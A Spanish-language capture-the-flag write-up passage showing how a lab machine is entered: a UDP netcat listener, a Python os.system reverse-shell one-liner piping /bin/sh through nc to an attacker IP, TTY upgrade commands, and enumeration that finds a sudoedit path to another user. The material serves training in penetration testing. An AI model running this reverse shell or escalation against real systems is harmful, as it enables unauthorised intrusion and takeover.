## Explotacion de vulnerabilidad & Ganando acceso {-}

### Reverse shell por UDP {-}

1. En la maquina de atacante con el parametro `-u`

    ```bash
    nc -u -nlvp 443
    ```

1.en la consola interactiva

    ```python
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc -u 10.10.14.20 443 >/tmp/f")
    ```

Y ya esta...

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Investigamos la maquina {-}

```bash
whoami

#Output
werkzeug

cd /home/alekos
cat user.txt
```

No podemos leer la flag. Quiere decir que vamos a tener que convertirnos en el usuario alekos.

```bash
id
sudo -l
```

El comando `sudo -l` nos dice que podemos ejecutar `sudoedit /var/www/*/*/layout.html` como el usuario alekos. 